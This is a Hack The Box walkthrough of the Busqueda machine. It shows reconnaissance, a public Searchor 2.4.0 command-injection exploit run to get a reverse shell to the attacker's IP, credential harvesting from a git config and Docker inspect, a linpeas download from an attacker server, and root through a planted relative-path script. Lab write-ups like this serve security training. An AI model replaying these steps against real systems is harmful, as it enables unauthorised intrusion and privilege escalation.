# HTB Machine: Busqueda

## Overview
Busqueda is a Linux machine hosting a Flask web application that's vulnerable to command injection through an outdated version of the Searchor library. After gaining initial access, privilege escalation is achieved through a combination of credential discovery, Docker inspection, and abusing a Python script with sudo privileges.

## Reconnaissance

### Port Scanning
I began with a port scan to identify open services:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.176.10 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.176.10 -oN nmap
```

**Open Ports:**
- **22/tcp** - OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
- **80/tcp** - Apache httpd 2.4.52

### Web Enumeration
Visiting the website on port 80 redirected me to `http://searcher.htb/`. I added this domain to my `/etc/hosts` file:

```bash
echo "10.129.176.10 searcher.htb" | sudo tee -a /etc/hosts
```

The website presented a search interface with a dropdown menu of search engines (Google, Bing, Yahoo, etc.) and an input field for search queries. The page footer revealed it was **Powered by Flask and Searchor 2.4.0**.
<img width="1279" height="775" alt="image" src="https://github.com/user-attachments/assets/e81a66f7-81eb-4254-a6a1-3f9c83ccc749" />

I tested the search functionality:
- When "Auto redirect" was off, the POST query parameter was reflected in the response
<img width="486" height="192" alt="image" src="https://github.com/user-attachments/assets/24e6961a-1ec0-4252-a03c-202a01fb26bb" />
<img width="971" height="438" alt="image" src="https://github.com/user-attachments/assets/dc0adb98-6275-4f6d-aedb-bfc4a62c2dd9" />


Autoredirect on:
<img width="1106" height="591" alt="image" src="https://github.com/user-attachments/assets/644fcd7c-b68e-43ad-90b2-596d231e3dd8" />


### Directory and Subdomain Enumeration
I ran directory brute-forcing to discover hidden paths:

```bash
feroxbuster -u http://searcher.htb/
```

Interesting findings:
- `/search` - Returned 405 Method Not Allowed
- `/server-status` - 403 Forbidden

I also checked for subdomains and vhosts:

```bash
ffuf -u http://10.129.176.10 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.searcher.htb" -fw 18
gobuster dns -d searcher.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

Both scans returned no results.

## Initial Access

### Vulnerability Research
Knowing the application used Searchor 2.4.0, I searched for known exploits. I discovered that version 2.4.0 is vulnerable to arbitrary command injection (CVE-2023-43325). The vulnerability exists in the `eval` function used to construct search URLs, allowing command injection through the search query parameter.

### Exploiting Command Injection
I found a public exploit and used it to gain a reverse shell:https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

```bash
git clone https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
cd Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
./exploit.sh searcher.htb 10.10.14.157 9001
```

Before running the exploit, I set up a netcat listener:
```bash
nc -lvnp 9001
```
<img width="381" height="496" alt="image" src="https://github.com/user-attachments/assets/6d36737f-4cfa-481d-9b46-652840a1e683" />


The exploit successfully executed, and I received a shell as the `svc` user.


## Lateral Movement

### Credential Discovery
I began enumerating the system. While searching for interesting files, I discovered credentials in `/var/www/app/.git/config` configuration:

```bash
cat config
```
<img width="737" height="277" alt="image" src="https://github.com/user-attachments/assets/8652c933-ecfc-44ba-9ecb-93f0bb1e6889" />

This revealed credentials for the user `cody`:
```
cody:jh1usoih2bkjaspwe92
```

### SSH Access
I attempted to use these credentials to connect via SSH as the `svc` user, and it worked:

```bash
ssh svc@10.129.176.10
Password: jh1usoih2bkjaspwe92
```

## Privilege Escalation

### Initial Enumeration
I transferred `linpeas.sh` to the host for automated enumeration:

```bash
# On attack machine
python3 -m http.server 8000

# On target
wget http://10.10.14.157:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Key findings:
- **Ubuntu 22.04.2 LTS**
- **Sudo version 1.9.9**
- The `svc` user could run a Python script as root without a password:

```bash
sudo -l
```
Output:

<img width="517" height="118" alt="image" src="https://github.com/user-attachments/assets/9265aabe-1b2f-4750-a412-a123c6194288" />


### Analyzing the System Checkup Script
I examined the script's functionality:
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```
<img width="572" height="105" alt="image" src="https://github.com/user-attachments/assets/a72c473a-7e58-45db-8f82-9c3f7902151c" />


```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```
<img width="1211" height="84" alt="image" src="https://github.com/user-attachments/assets/94965fc4-9cca-4fa2-9d38-f5e60bd94a41" />

This displayed running containers, including a `gitea` container.

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect gitea
```
This returned an error showing the correct usage: `Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>`

Using Docker's Go template feature, I inspected the gitea container:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```
<img width="617" height="277" alt="image" src="https://github.com/user-attachments/assets/bd2bbcec-bba1-4505-9dde-328fd5661cb7" />

This revealed MySQL credentials in the container's environment variables:
```
MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh
MYSQL_USER=administrator
```

### Testing the Credentials
I tested these credentials for portal access:

<img width="647" height="626" alt="image" src="https://github.com/user-attachments/assets/d1d3babc-a376-4fff-b6a8-9fbe1f2c9a9d" />

The login was successful, confirming these were valid system credentials.

### Understanding the Vulnerability
I examined the system-checkup.py script:

<img width="375" height="202" alt="image" src="https://github.com/user-attachments/assets/28b0af02-777b-437f-8234-0f2606f42a40" />

The script revealed a vulnerability - it used a **relative path** to execute `full-checkup.sh`:

This meant that if I could create my own malicious `full-checkup.sh` script in a location where the sudo command would be executed, I could achieve privilege escalation.

### Exploiting Relative Path Vulnerability
I created a reverse shell script in `/tmp`:

<img width="691" height="58" alt="image" src="https://github.com/user-attachments/assets/05d8c121-5bcc-4990-a935-cf6753f3ea2e" />


I set up a netcat listener on my attack machine:
```bash
nc -nvlp 9001
```

Then, from /tmp directory, I executed:

```bash
cd /tmp
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

The script executed my malicious `full-checkup.sh` with root privileges, and I received a root shell on my listener.

<img width="524" height="194" alt="image" src="https://github.com/user-attachments/assets/66b0a24b-041a-4555-bb3c-f24e21eebc66" />

Grabbed the flag in /root folder.
